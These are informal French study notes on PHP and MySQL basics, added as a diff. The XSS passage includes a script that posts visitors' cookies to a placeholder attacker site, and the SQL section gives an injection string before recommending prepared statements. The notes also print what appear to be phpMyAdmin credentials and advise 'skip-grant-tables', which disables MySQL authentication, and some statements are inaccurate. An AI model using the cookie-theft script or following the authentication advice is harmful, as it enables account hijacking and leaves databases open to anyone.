@@ -1,0 +1,1354 @@
+====[introduction]====
+
+php c'est un lagage script utilisé côté serveur,
+pour mettre du code php dans une page php, on fait
+
+<?php 
+
+	code;
+
+?>
+
+le <?php ?> en fait je crois que c'une une sorte de prologue xml
+
+remarque, il existe d'autres balises php genre
+<? et ?> = pareil mais fait pour gagner du temps, utilisable si on a la directive short_open_tag du php.ini, ou si php a été configuré avec l'option --enable-short-tag
+<% et %? = c'est des balises asp, mais ca a ete supprimé de php 7, ce meme que les balises <script langage="php">
+<?= des trucs et des machins ?> = equivalent à echo("des trucs et des machins");, suivant la directive short_open_tag
+
+IMPORTANT
+si un fichier php est uniquement du code php, il est RECOMMANDÉ DE NE PAS METTRE LA BALISE DE FERMETURE A LA FIN DU FICHIER
+==> ca permet d'eviter d'oublier un espace ou une nouvelle ligne apres la balise de fermeture (et donc d'avoir ces elements sur la sortie)
+
+du coup on fait 
+
+<?php
+mon code
+et voila
+
+
+pour afficher du texte et des variables,
+on a echo() et print();
+
+mais on recommande plutot echo qui est plus rapide
+
+====[les commentaires]===
+
+//comme ca
+
+/*
+comme ca 
+et ca 
+et ca 
+*/
+
+===[petits trucs de config]===
+
+par defaut, si ya un soucis dans notre code ca n'affichera pas de message d'erreur, le script ne renverra tout simplement rien
+
+pour afficher des infos (et notamment le lieu d'emplacement de php.ini) on a la fonction
+phpinfo();
+
+pour definir les erreurs que nous rapport php on doit jouer sur la directive
+error_reporting
+(cf les commentaires pour lire leurs recos)
+
+pour activer le retour des erreurs, on a la directive
+display_errors
+
+===[les variables]===
+
+les variables sont declarees et appellées avec un $
+genre
+$test = 3;
+echo($test);
+
+
+On peut assigner des variables par valeur
+genre
+$coucou = "salut";
+
+ou alors on peut les assigner par reference
+genre
+$coucou = &$test;
+
+==> si on modifie $coucou, ca modifie $test et vice versa
+
+==> seules les variables nommées peuvent etre assignees par reference
+
+
+Il est recommandé d'initialiser les variables à leur declaration
+(sinon ca leur donne une valeur par defaut, genre
+bool --> false
+int --> 0
+float --> 0
+string --> ''
+array --> [])
+
+si une variable ne contient rien, elle contient NULL
+
+avec le echo, pour concatener on peut faire 
+soit
+
+echo("je m'appelle $name et je suis tres gentil");
+soit
+echo('je m\'appelle '.$name.' et je suis tres gentil');
+==> la seconde technique est un peu plus rapide d'execution car il n'y a pas besoin de parsing pour savoir ce qui est du plain text et ce qui est une variable 
+
+
+
+pour le debug, on a la fonction 
+var_dump($var)
+qui echo() le contenu de la variable avec dfferentes informations comme le type, etc
+
+
+===[particularités sur la portée des variables]===
+
+c'est comme en C, sauf que
+une variable declaree et initialisée dans l'espace global, 
+si on l'appelle dans une fonction, 
+php considere que c'est une variable locale non initialisée et lui donne sa valeur par defaut, qui depend de son type
+pour utiliser une variable declaree dans l'espace global dans une fonction, on doit faire
+
+<?php
+
+	$a = 'pouet';
+
+	function coucou()
+	{
+		global $a; 
+
+		echo($a);
+	}
+
+
+voila
+remarque, on peut utiliser le kw global dans l'espace global, si on include/require le fichier php dans un fichier, dan\s le bloc d'une fonction
+(include et requiere c'est grosso-modo pareil mais require impose que le fichier existe, sinon ca plante = fatal error ==> plus safe que include qui n'emet qu'un warning donc le script continue de tourner)
+==> remarque, require et include sont des statements et pas des fonction, donc l'utilisation des () n'est pas recommandée
+
+on a aussi require_once et include_once, qui font pareil mais si le fichier a deja été inclus, il ne le sera pas si le statement est refait pour le meme fichier
+du coup toutes les variables definies dans le fichier inclus sont accessibles dans le fichier qui inclus
+
+
+sinon, on a aussi la possibilité d'utiliser un tableau assoc predefini pour appeller les variables globales dans une fonction
+genre
+$GLOBALS['nomVariable']
+
+
+les variables superglobales par contre n'ont pas besoin de ces trucs là, là c'est comme en C, on les appelle directement
+
+
+===[les variables statiques]===
+
+c'est comme en C
+on ne peut pas initialiser les variables statiques de fonction sur la base d'une fonction 
+genre on peut pas faire
+static $pouet = sqrt(529);
+
+on peut faire que
+$pouet = 42;
+ou, depuis php 5.4 
+$pouet = 1+2;
+
+
+===[les variables dynamiques]===
+
+c'est des variables dont le nom est une variable 
+
+genre
+$name ='bonjour';
+
+et $$name = 'pouet';
+
+du coup on a 2 variables declarées dans l'arbre des symboles php 
+$name = 'bonjour';
+$bonjour = 'pouet';
+
+pour appeller une variable dynamique, on peut: 
+soit l'appeller de maniere statique
+genre
+$bonjour ==> pas tres interessant car on supprime tout l'interet de la variable dynamique
+
+soit l'appeller de maniere dynamique 
+${$name}
+
+===[les constantes]===
+
+On les declare comme ca 
+const SALUT = 42; //YA PAS DE $ NI A LA DECLARATION, NI A L'APPEL
+ou alors 
+bool define ( string $name , mixed $value [, bool $case_insensitive = false ])
+
+==> c'est plus restrictif avec const qu'avec define(), cf la doc
+
+
+===[les constantes magiques]==
+
+Elles sont définies par php et permettent d'avoir acces a des trucs utiles genre
+__LINE__ = ligne courante dans le fichier 
+__FILE__ = Le chemin complet et le nom du fichier courant avec les liens symboliques résolus. Si utilisé pour une inclusion, le nom du fichier inclus est retourné. 
+__FUNCTION__ = nom de la fonction courante
+__CLASS__ = nom de la classe courante
+__METHOD__ = nom de la methode courante
+__NAMESPACE__ = nom du namespace courante
+
+
+===[les arrays]===
+
+on les declare comme ca pour les arrays litteraux
+$arr = array(1, 2, 3, 4);
+
+Si on fait 
+$arr = array(1, 2, 3);
+$arr[] = 4;
+==> ca push 4.
+
+pour les arrays associatifs, on fait
+$arr = array(
+	k1 => v1,
+	k2 => v2,
+	...
+	kn => vn
+);
+
+
+en php les arrays sont dynamiques comme en php, en fait c'est des collections 
+
+pour parcourir un array, on a plusieurs possibilités
+avec la boucle for, en recuperant la taille du tableau avec la fonction count();
+genre
+for($count = 0; $count < count($arr); $count++)
+{
+	//faire des trucs pour chaque entrée
+}
+
+avec la boucle foreach
+foreach($arr as $key => $value)
+{
+	//faire des trucs pour chaque entree
+}
+
+
+enfin, pour le deboggage, on a print_r() qui affiche l'array bien comme il faut pour debogger 
+
+
+pour faire des recherches dans un array, on a 
+bool array_key_exists ( mixed $key , array $array ) = verifier si la cle existe dans l'array
+bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) = verifie si la valeur se trouve dans l'array
+mixed array_search ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) = retourne l'index de la valeur recherchée, false si yen a pas 
+
+
+===[les conditions]===
+
+C'est comme en javascript
+pareil avec le === et le !==
+
+au niveau des et ou etc
+on a 
+AND ou &&
+OR ou ||
+
+
+pareil pour switch case
+pour les operateurs ternaires, c'est comme en C
+
+
+===[boucles]===
+
+on a while et for, c'est comme en C
+
+ATTENTION avec for, la variable counter continue d'exister ensuite, donc attention
+pareil pour les variables initialisées dans une boucle for, elles ne cessent pas d'exister a la fin du bloc, comme en js , donc attention
+
+Ya aussi une boucle foreach qui fonctionne avec les hashtable, dont la syntaxe est 
+foreach (array_expression as $value){
+    //commandes
+}
+
+ou meme
+foreach (array_expression as $key => $value){
+    //commandes
+}
+
+
+remarque: 
+il existe une syntaxe alternative depuis php 4
+au lieu d'utiliser des accolades, on fait
+premiere accolade { remplacée par un :
+second accolade } remplacée par un endmachin
+genre au lieu de 
+if(condition)
+{
+	code
+}
+
+on peut faire 
+if(condition) :
+	code
+endif
+
+pas tres interessant
+
+
+===[les fonctions]===
+
+on les declare comme ca 
+function maFonction(args)
+{
+	code
+}
+
+
+remarque: ya des goto mais goto ca pue
+
+
+
+===[la methode get]===
+
+ca permet de passer des infos dans l'url 
+on recommande de ne pas avoir une url ayant un nombre de chars > 256
+du coup on passe les valeurs comme ca 
+adresse.php?p=v&p2=v2 etc
+
+ensuite pour récuperer les valeurs on a la variable superglobale $_GET['nomParam']
+
+bien sur pour pas avoir d'erreur, il faut check si la variable a bien ete passée dans l'url avec 
+if(isset($_GET['mon_parametre']))
+{
+	faire des trucs
+}
+
+remarque: 
+des qu'on affiche une valeur qui a été definie par le user, 
+on fait prealablement passer la valeur par htmlspecialchars() pour eviter les injections
+
+pour le post c'est pareil mais avec la superglobale 
+$_POST['nomChamps']
+
+
+===[la gestion d'envoi de fichiers via formulaire]===
+
+il faut mettre un attribut dans la balise form
+<form enctype="multipart/form-data">
+
+puis mettre un input type="file"
+voila
+
+ensuite dans le action.php
+on peut recupere les infos du fichier uploadé (qui est stocké dans un dossier temporaire avec un nom temporaire)
+avec la superglobale $_FILES['nomDuChamps']
+
+C'est un array qui contient 4 clés
+name = nom du fichier
+tmp_name = nom du fichier sur le serveur (il est d'abord deplacé dans /tmp avec un nom generé aléatoirement par php)
+type = mime-type du fichier, genre image/png, image/jpeg, etc ==> Attention, le mime-type est falsifiable
+error = si ya eu une error, 0 si pas de probleme 
+size = taille en octet du fichier => souvent la config de php interdit l'envoi de fichiers de taille > 8Mo
+
+Alors on verifie si l'upload est ok avec $_FILES['nomCHamps']['error'] == 0
+et si le fichier est conforme (si c'est pas un fichier php, s'il n'est pas verolé, de taille limitée, etc)
+
+remarque, pour checker l'extension du fichier, on a la fonction 
+pathinfo("nom du fichier") qui permet d obtenir un array contenant pleins de trucs, dont l'extension du fichier avec la clé 'extension'
+on peut alors la comparer à un array d'extensions autorisées par exemple, avec la fonction in_array()
+
+
+si le checkup est ok, on l'upload definitivement sur le serveur avec la fonction 
+move_uploaded_file($_FILES['nom_du_champs']['tmp_name'], 'chemin/nomdufichierSurleserveur.ext')
+==> ATTENTION, il faut que le propriétaire du fichier action.php dispose des droits d'ecriture dans le dossier d'upload (et probablement dans le dossier temporaire egalement mais normalement sur ce dossier on est a 777)
+
+
+====[les variables superglobales]===
+
+c'est des variables accessibles partout dans php
+
+parmis elles on peut citer
+    $_SERVER : ce sont des valeurs renvoyées par le serveur. Elles sont nombreuses et quelques-unes d'entre elles peuvent nous être d'une grande utilité. Je vous propose de retenir au moins$_SERVER['REMOTE_ADDR']. Elle nous donne l'adresse IP du client qui a demandé à voir la page, ce qui peut être utile pour l'identifier.
+
+    $_ENV : ce sont des variables d'environnement toujours données par le serveur. C'est le plus souvent sous des serveurs Linux que l'on retrouve des informations dans cette superglobale. Généralement, on ne trouvera rien de bien utile là-dedans pour notre site web.\
+
+    $_SESSION : on y retrouve les variables de session. Ce sont des variables qui restent stockées sur le serveur le temps de la présence d'un visiteur. Nous allons apprendre à nous en servir dans ce chapitre.
+
+    $_COOKIE : contient les valeurs des cookies enregistrés sur l'ordinateur du visiteur. Cela nous permet de stocker des informations sur l'ordinateur du visiteur pendant plusieurs mois, pour se souvenir de son nom par exemple.
+
+    $_GET : vous la connaissez, elle contient les données envoyées en paramètres dans l'URL.
+
+    $_POST : de même, c'est une variable que vous connaissez et qui contient les informations qui viennent d'être envoyées par un formulaire.
+
+    $_FILES : elle contient la liste des fichiers qui ont été envoyés via le formulaire précédent.
+
+
+===[les sessions]===
+
+en gros c'est un moyen de stocker des infos dans des variables entre les pages
+en gros ya 2 fonctions
+
+session_start() ==> A APPELLER avant tout output, comme pour les headers++
+session_destroy()
+
+session_start() = regarde si le navigateur de l'utilisateur a un cookie (du nom de PHPSESSID) avec un id de session du site, 
+si oui, il recupere l'id de session et de-serialise la variable $_SESSION correspondant
+a l'id de session et charge son contenu dans la $_SESSION du script.
+S'il n'y a pas de cookie de session sur le navigateur du user ou que l'id de session stocke dans le cookie ne correspond a aucune $_SESSION sérialisée, 
+ca crée une nouvelle session avec un nouvel id de session et un nouveau cookie de session stocké sur l'ordi du user.
+
+session_destroy() = detruit la sauvegarde de $_SESSION correspondant a l'id de session sur le serveur, detruit le cookie de session sur le navigateur du user.
+par contre les variables $_SESSION continuent d'être exploitables juskà la fin du script
+
+
+remarque: si le user n'accepte pas les cookies, php ne pourra pas retrouver le sessionID
+une solution est de choper l'id de la session avec la constante SID, lors du session_start() avec la definition des variables $_SESSION
+(l'utilisation de session_start() en debut de code n'est pas obligatoire si une session a déjà été préalablement démarée)
+
+remarque2: en fait d'apres mes experiences, je crois que session_start() ne cree un cookie / va chercher un cookie de session QUE si, apres le session_start(), on appelle une
+$_SESSION[]
+
+
+
+===[les cookies]===
+
+c'est des fichiers textes de petite taille permettant de stocker des informations sur le navigateur (et donc l'ordinateur) du client
+
+en general on recommande de ne stocker qu'une info par cookie (taille de cookie limitee a quelques ko) 
+
+remarque: les valeurs stockées sont des string
+s'il y a des specialChars (genre é, <, etc)
+ils sont encodé en url encode
+https://www.w3schools.com/tags/ref_urlencode.asp
+s
+
+les cookies sont stockés de differentes facon selon le navigateur
+parfois c'est n fichiers textes dans un dossier particulier du dossier d'installation du navigateur 
+parfois c'est des entrée dans une bdd sqlite (comme c'est le cas pour firefox par exemple,
+genre dans /home/nomUser/.mozilla/firefox/7qlhmjlx.default/cookies.sqlite
+==> et on peut voir le contenu de la bdd dans preferences -> gestion des cookies
+==> on peut aussi utiliser le storage manager de firefox
+
+En general les cookies sont classés par sites web (c'est à dire par nom de domaine)
+
+
+Pour creer un cookie et le stocker sur la machine du user, on a la fonction 
+setcookie()
+==> c'est comme session_start() et pour les headers, il faut appeller cette fonction AVANT TOUT OUTPUT
+==> en fait c'est du au fait que ca send un Set-Cookie HTTP response header, c'est a dire un header (<cookie-name>=<cookie-value>)
+
+bool setcookie ( string $name [, string $value [, int $expire = 0 [, string $path [, string $domain [, bool $secure = false [, bool $httponly = false ]]]]]] )
+==> l'expration se note en timestamp, 
+==> du coup si on veut mettre une durée en s, on met time() + durée (sinon on peut coder une fonction qui transforme des jours en nombre de secondes, etc as you want)
+$path = chemin sur le serveur (en considerant comme racine le dossier www) du dossier sur lequel le cookie sera disponible, en d'autre terme tout fichier php faisant
+        partie du dossier en question, ou d'une sous-dossier du dossier en question, dispose de l'acces au cookie. Par defaut, ce parametre vaut le dossier dans lequel le script
+        php qui a generé le cookie se trouve
+$domain = domaine emetteur du cookie, par defaut c'est le domaine de notre site
+$secure = bool precisant si le cookie ne doit etre transmis que a travers une connexion securisée httpS depuis le client.
+          coté serveur, c'est à nous d'envoyer le cookie uniquement sur des connexions securisées, par exemple via $_SERVER['HTTPS']
+$httponly = bool. si true, le cookie ne sera accessible que via le protocole http, le rendant indisponible via javascript par exemple ==> un autre moyen de se proteger des XSS
+            MAIS c'est supporté que par les navigateurs recents ==> NEVER FORGET YOUR htmlspecialchars(); (ajouté en php 5.2)
+
+en fait, une requete http set-cookie header, ca a cette gueule la
+Set-Cookie: <cookie-name>=<cookie-value> 
+Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>
+Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>
+Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>
+Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>
+Set-Cookie: <cookie-name>=<cookie-value>; Secure
+Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly
+
+Set-Cookie: <cookie-name>=<cookie-value>; SameSite=Strict
+Set-Cookie: <cookie-name>=<cookie-value>; SameSite=Lax
+
+
+
+par exemple on pourrait ecrire
+setcookie('pseudo', 'Branlouis', time() + 365*24*3600); //expiration dans 1 an
+
+Pour modifier un cookie existant on fait pareil, en gardant le meme non du cookie et ca modifiera le cookie (en fait ca l'ecrasera)
+
+Pour supprimer le cookie existant, il suffit de le modifier en lui mettant une valeur NULL et une date d'expiration correspondant au moment actuel
+setcookie('monCookie', NULL, time());
+
+REMARQUE IMPORTANTE
+suite à l'appel de la fonction setcookie(), ca a créé le cookie sur le navigateur, 
+MAIS VU QUE PHP A DEJA CHÉCKÉ LE NAVIGATEUR ET STOCKÉ LES COOKIES DANS $_COOKIE[]
+ce cookie n'est pas accessible dans la variable $_COOKIE, il ne le sera que lors du RECHARGEMENT DE LA PAGE
+
+REMARQUE IMPORTANTE: 
+un cookie qui a le meme nom mais un parametre different (path, domain, etc) EST CONSIDERE COMME UN COOKIE DIFFERENT !
+du coup si on veut le supprimer, il faudra utiliser la methode setCookie avec chacun des parametres et une expiration a time();
+
+
+
+
+
+
+=====
+remarque et rappel sur la faille xss: 
+c'est quand le user a la possibilité de mettre du code html dans la page, genre
+quand ya un truc du genre 
+echo $_GET['param'];
+par exemple quand ya la possibilié de laisser un commentaire et que dans le commentaire on va metre
+<script>alert('pouet')</script>
+
+ca permet de faire executer du javascript par les autres visiteurs de la page, qui afficheront ce commentaire
+
+Du coup, en javascript, on a la variable
+window.document.cookie qui retourne une chaine de caractere contenant tous les cookies et leurs valeurs pour le site sur lequel on est
+(<faudrait voir comment ca fonctionne, est-ce qu'il n'y a pas moyen de récupérer des cookies d'un autre site en se faisant passer pour quelqu'un d'autre ?>)
+
+la chaine se presente comme ca
+"nomCookie1=valeurCookie1; nomCookie2=valeurCookie2" etc
+
+remarque: un truc ultra chelou est que pour modifier un cookie en js, on fait
+window.document.cookie = 'nomCookieaModier=nouvelleValeur';
+et apres si on fait
+console.log(window.document.cookie);
+ca affiche toutes les valeurs de cookie et le cookie avec sa nouvelle valeur, et pas simplement 'nomCookieaModier=nouvelleValeur'
+
+De meme, pour ajouter un nouveau cookie, on faire 
+window.document.cookie = 'nouveauCookie=valeur';
+
+du coup, en tant que pirate de l'informatique, je peux, via une faille xss, mettre le code javascript suivant dans la page: 
+<script>
+$.post('http://monSitePersoDePirateMalicieux.com/scriptMalicieux.php', window.document.cookie);
+</script>
+
+==> ca va envoyer via post le contenu des cookies de l'utilisateur dans une de mes pages php, qui pourra alors le stocker dans une bdd par exemple
+(si dans ces cookie il y a des login ou pw ou un id de session, je peux peut-être recreer le cookie dans mon dossier de navigateur, aller sur le site et me faire passer pour la personne qui a executé
+mon script javascript malicieux).
+
+
+
+
+
+
+
+=====
+
+pour éviter de rendre accessible un cookie par javascript sur les navigateurs recents (et donc eviter qu'une personne se le fasse voler via une faille xss)
+on peut activer l'option httpOnly dans la fonction setCookie
+
+Ensuite, lors du chargement de toute page php, 
+php recupere prealablement tous les cookies du navigateur du client (<comment ? est-ce qu'il se base sur le nom du site ? faut trouver comment ca fonctionne>)
+et les stocke dans la superglobale
+$_COOKIE['nomCookie'];
+
+
+
+===[lire et ecrire dans un fichier]===
+
+on a 
+$file = fopen('chemin/nomFichier', 'mode')
+==> mode = r, r+, a, a+ (idem mais en append et si le fichier n'existe pas il est créé ==> attention aux droits du dossier en question)
+
+et fclose($file);
+
+
+ensuite, pour lire on a
+fgetc($file);
+
+et fgets($file);
+
+
+pour ecrire on a 
+fputc($file)
+
+et
+
+fputs($file)
+
+
+pour vider le contenu d'un fichier on a 
+ftruncate($monfichier, 0);
+
+Pour insérer un \n on utilise la constante
+PHP_EOL
+
+===[les sgbd]===
+
+c'est les systemes de gestion de bdd
+ca sert a stocker des donners dans un truc plus efficace qu'un fichier texte (en terme de compression et de temps d'acces aux données, filters, etc)
+
+remarque: parfois on a lamp installé et phpmyadmin installé mais ca fonctionne pas, 
+il faut modifier le fichier de config d'apache2 pour include les directives necessaires
+--> ouvrir en sudo /etc/apache2/apache2.conf
+--> a la fin du fichier, ajouter 
+Include /etc/phpmyadmin/apache2.conf
+--> redemarrer apache avec sudo service apache2 restart
+--> et voila on peut y acceder par localhost/phpmyadmin
+
+Ensuite on peut se loger sur phpmyadmin en utilisant les logins et pw
+pour moi c'est
+login: JeanPeteQuiFouette
+Pw: tupeuxmettremoinsfortlamusiquesteup?
+
+Remarque sur mysql et les moults galeres: 
+--------
+1) je constate que je suis nul dans tout ce qu'il y a derriere mysql, c'est mystique, il va falloir potasser tout ca
+(configuration, langage, systeme d'authentification, etc)
+
+2) il y a une particularité dans la facon de s'authentifier dans mysql: 
+- soit on a la facon native = mysql_native_password = (utilisation d'un login et d'un mot de passe, la liste des users et leurs pw correspondant ainsi que leurs droits etant stockés...
+dans une table de mysql, du coup il faut avoir un compte root paramétré à l'installation de mysql, qui permet d'acceder à cette table afin de créer des users avec des droits plus ou moins restreints)
+- soit on a la facon un peu speciale qui consiste à utiliser les comptes sur le systeme unix pour acceder à des comptes de mysql = plugin auth_socket
+- soit ya encore d'autres moyens avec d'autres plugins 
+
+OR ! MON GARS ! 
+Depuis Ubuntu Bionic 18.04, Ubuntu lie par defaut le compte root de ubuntu avec auth_socket en installant mysql
+du coup avant 18.04, pour lancer mysql dans la console et faire des trucs, on faisait
+mysql -u root -p
+et on entre le pw
+
+depuis 18.04, on fait 
+sudo mysql 
+et voila on est dans mysql et on peut faire des trucs
+
+LE PROBLEME, c'est que si dans l'installation ya des soucis du genre problemes de synchronisation, bah c'est la merde
+le plus simple pour le moment c'est de faire en sorte que l'authentification se face de facon native
+pour ca il faut modifier le fichier de configuration
+/etc/mysql/mysql.conf.d/mysqld.cnf
+et dans la partie basic settings, 
+rajouter la ligne
+skip-grant-tables
+
+ensuite pour prendre en compte les changements il faut restart apache et mysql avec
+sudo service apache2 restart
+et
+sudo service mysql restart
+
+et ensuite on peut se loger sur mysql normalement
+
+
+===[ce que j'ai pigé de mysql]===
+
+en gros de base ya pleins de ddb dedans (probablement des trucs que j'ai installé en plus, ma foi)
+==> en fait, les bdd mysql, information_schema et performance_schema servent au fonctionnement interne de mysql
+==> la bdd phpmyadmin sert au fonctionnement interne de phpmyadmin
+et notamment la bdd mysql
+pour voir les bdd dans mysql on fait 
+show databases
+
+pour selectionner la bdd mysql on fait tout simplement 
+use mysql
+
+ensuite, pour voir les tables qu'il y a dans la bd mysql on fait 
+show tables
+
+on a pleins de tables et notamment la table 
+user
+qui a notamment ces champs
+- host = (ip de l'hôte), ==> ici ya que du localhost = 127.0.0.1
+- User = identifiant du User
+- des champs genre
+	- select_priv
+	- create_priv
+	- ...
+	- commande_priv = valeur Y ou N = le user a-t-il le droit faire cette commande
+
+- le moment où le pw a ete changé, la durée de validité, si le pw est périmé, etc
+- account_locked = Y ou N ==> interessant 
+
+
+==> visiblement les pw ne sont pas stockés dans cette table 
+
+
+
+
+===[phpmyadmin et bases de mysql]===
+
+on recommande dans une table d'avoir un champs ID en primary key not null auto-increment pour definir les entrees et pouvoir lier les tables entre elles
+toute table doit posseder un champs qui joue le role de clé primaire
+la cle primaire permet d'identifier de maniere unique une entree dans la table 
+les tables sans cles primaires ont une performance beaucoup plus reduite
+l'auto-increment permet, lors de l'ajout d'une entree dans la table, que mysql genere lui-meme l'id qui sera la valeur de l'id le plus grand + 1
+
+
+
+Au niveau des principaux types de champs dans une table mysql, on a 4 grands types:
+
+- NUMERIC = nombres, avec des sous-types en fonction de l'intervalle, le but etant de choisir ce qui se rapproche le plus de l'ordre de grandeur afin d'économiser l'espace de stockage 
+- DATE and TIME = avec differents sous-types en fonction du format
+		==> on conseille de ne JAMAIS nommer de champ avec le nom "date" car c'est un kw sql et peut poser probleme
+		    avec certains systemes de bdd (comme oracle)
+- STRING = idem
+- SPATIAL = utilisé pour la cartographie, ici ca nous concerne pas encore
+
+
+Pour VARCHAR, qui est un sous type STRING, c'est un texte court, dont on doir specifier la taille maximale en nombre de caracteres = nombre compris entre 1 et 255
+
+au niveau de phpmyadmin on a differents onglets, genre
+afficher = afficher les entrees de la table
+structure = afficher la structure de la table
+inserer = entrer manuellement des entrees dans la table 
+
+on a aussi d'autres onglets comme 
+sql = entrer une requete sql (on a aussi le bouton SQL dans phpmyadmin qui permet d'ouvrir une popup pour taper les requetes, utile++)
+importer = permet de prendre un fichier .sql et l'executer pour obtenir quelque chose sur notre server sql (genre une bdd ou une table)
+exporter = c'est l'inverse, ca permet de prendre des trucs de notre serveur et le mettre sur un fichier sql pour l'importer sur un autre serveur par exemple, ou faire un backup
+operations = des trucs genre - changer le nom de la table - deplacer la table - copier la table - optimiser la table
+vider = 
+supprimer = 
+
+
+pour exporter, le mieux c'est d'inclure la structure ET les données (logique)
+
+===[gerer mysql avec php]===
+
+Pour se connecter, on a differentes fonctions mais yen a pas mal qui sont desuettes
+- mysql_machin() ==> desuet 
+- mysqli_machin() ==> desuet 
+- PDO ==> yes
+
+
+l'avantage de PDO c'est que 
+- ca permet de se connecter a n'importe quelle bdd (oracle, mysql, postgreSQL, etc)
+
+Normalement, PDO est activé par defaut
+sinon faudra l'activer en modifiant le fichier php.ini
+
+Pour ouvrir une connexion à une bdd on fait 
+try
+{
+	$bdd = new PDO('mysql:host=localhost;dbname=test;charset=utf8', 'root', '');
+}
+catch (Exception $e)
+{
+        die('Erreur : ' . $e->getMessage());
+}
+
+
+Remarque, pour eviter les emmerdes lors de l'upload, on peut stocker les id et pw dans des variables dans un fichier externe et le require() dans le fichier qui se connecte
+(mais c'est peut-être bof niveau secu, faudra se renseigner)
+
+pour executer une requete, on fait
+$response = $bdd->query('requete SQL');
+
+genre 
+$response = $bdd->query('SELECT * FROM Ma_table');	//remarque, apparemment pas besoin de ;
+
+
+remarque: 
+on peut utiliser du regex sur des requetes mysql
+genre
+SELECT nom FROM visiteurs WHERE ip REGEXP '^84\.254(\.[0-9]{1,3}){2}$'
+
+pour afficher les resultats, on fait
+$datas = $reponse->fetch();
+==> fetch() return un array ou la clé est le nom du champs, cet array correspond à la premiere entrée, et quand on l'appelle ca passe à la 2e entrée, 
+==> si ya plus d'entrées, ca renvoit false
+en fait c'est comme un getNextLine
+
+du coup pour afficher toutes les entrees, on fait 
+while ($data = $reponse->fetch())
+{
+	echo ($data['id']);
+	echo ($data['name']);
+}
+$response->closeCursor();	//termine le traitement de la requete, c'est pour eviter d'avoir des emmerdes a la requete suivante.
+
+
+voila 
+
+au niveau de sql, on a differents selecteurs
+- where = genre where champs='valeur'
+- order by = determine un tri, genre par id et decroissant ==> order by prix DESC ou alors order by prix ASC
+- limit = pour limiter le nombre de retour, ==> limit 0, 20 = tronquer entre le premier et les 20 suivants inclus ==> retourne les 20 premieres entrées/ 10,2 retourne la 11e, 11e et 12e entrees
+
+==> pour que ca fonctionne il faut le faire dans cet ordre (d'abord where, puis order by, puis limit pour finir)
+
+on peut ajouter
+- distinct = ne retourne qu'une seule fois chaque valeur distincte (genre SELECT DISTINCT nom FROM maTable)
+
+
+On peut mettre des variables dans les requetes, genre afin de selectionner les bonne entrée
+genre 
+$reponse = $bdd->query('SELECT nom FROM jeux_video WHERE possesseur=\'' . $_GET['possesseur'] . '\'');
+
+SAUF QUE ya une faille, malgré des htmlspecialchars(), on peut faire des injections sql car vu qu'on concatene la chaine, 
+on peut malgré tout avoir un $_GET['possesseur'] du genre
+pouet\' OR 1=1
+
+et du coup ca peut permettre d'avoir une reponse positive a un controle, ou de recupere des infos dans la bdd comme des id ou des pw, ou autres
+
+donc le plus safe, c'est de faire des requetes preparées
+- c'est plus safe
+- c'est plus rapide pour la bdd si la requete est executée plusieurs fois
+
+
+on fait comme ca 
+$request = $bdd->prepare('SELECT nom FROM jeux_video WHERE possesseur = ? AND name = ?');
+puis 
+$req->execute(array($_GET['possesseur'], $name));
+==> ATTENTION, c'est un array qu'il faut transmettre a execute();
+
+On peut aussi, pour ameliorer la lisibilité du code, faire comme ca 
+$req = $bdd->prepare('SELECT nom, prix FROM jeux_video WHERE possesseur = :possesseur AND prix <= :prixmax');
+$req->execute(array('possesseur' => $_GET['possesseur'], 'prixmax' => $_GET['prix_max']));
+
+Et voila
+PAR CONTRE il faudra quand meme bien checker les données stockées dans les variables AVANT de faire la requete, pour que ce soit propre 
+
+Enfin, au niveau de la gestion des erreurs, 
+on peut faire en sorte d'avoir plus de details en indiquant des trucs lors de la connexion a la bdd
+$bdd = new PDO('mysql:host=localhost;dbname=test;charset=utf8', 'root', '', array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
+
+Bien sûr ca c'est pour le local, quand on lance en prod, moins on donne de details, mieux c'est
+
+Remarque: les valeurs d'une $str ne sont pas parsées comme du code.
+
+enfin, pour close la connexion (comme on le ferait avec mysql_close())
+on fait
+if ($bdd)
+	$bdd = NULL;
+
+vala
+
+
+Au niveau des insertions sql, on fait comme ca
+INSERT INTO maTable(champs1, champs2, champs3, ..., champsN) VALUES('v1', 'v2', 'v3', ..., 'vN');
+==> remarque, pour les int, pas besoin de guillemets
+==> pour les champs generes (genre id) il faut laisser la valeur vide = '', a la limite on n'a pas a l'indiquer
+
+pour insérer, faut pas utiliser $bdd->query("request"); 
+mais 
+$bdd->exec("request");
+(a ne pas confondre avec ($bdd->prepare("request"))->execute();
+mais bon, on peut utiliser la facon classique avec du prepare, comme ca
+$req = $bdd->prepare('INSERT INTO jeux_video(nom, possesseur, console, prix, nbre_joueurs_max, commentaires) VALUES(:nom, :possesseur, :console, :prix, :nbre_joueurs_max, :commentaires)');
+$req->execute(array(
+	'nom' => $nom,
+	'possesseur' => $possesseur,
+	'console' => $console,
+	'prix' => $prix,
+	'nbre_joueurs_max' => $nbre_joueurs_max,
+	'commentaires' => $commentaires
+	));
+
+
+Pour modifier une donnée dans la bdd, on fait 
+UPDATE maTable SET Champs1=v1, champs2=v2, ... WHERE ID=42
+
+c'est pareil que pour les insertions, faut utiliser 
+$bdd->exec();
+ou ($bdd->prepare())->execute();
+
+
+Enfin, pour la suppression, on fait 
+DELETE FROM maTable WHERE champ1=v1
+si on oublie le WHERE ca vide la table ATTENTION
+on peut filtrer plus finnement avec des AND et des OR
+
+
+
+REMARQUE au niveau des erreurs sql
+souvent, ya pas de renvoi d'erreur lors de l'execution de la requete sql, mais le retour de execute(); ou query(); ne sera pas un objet pdoStatement, mais un bool false
+du coup, apres on appelle $req->fetch() sauf qu'un bool false n'est pas un objet disposant d'une methode fetch();
+
+pour avoir des erreurs plus explicites, on fait 
+$resp = $bdd->query('SELECT nom FROM jeux_video') or die(print_r($bdd->errorInfo()));
+
+
+===[les fonctions sql]===
+
+on a deux types de fonctions en sql
+- les fonctions scalaires = agissent sur chaque entrée (genre pour chaque entrée, mettre le champs nom en majuscule)
+- les fonctions d'agregat = utilise l'ensemble des entrées pour retourner une seule valeur (genre calcul de moyenne)
+
+
+exemple de fonction scalaire: UPPER()
+on l'utilise comme ca 
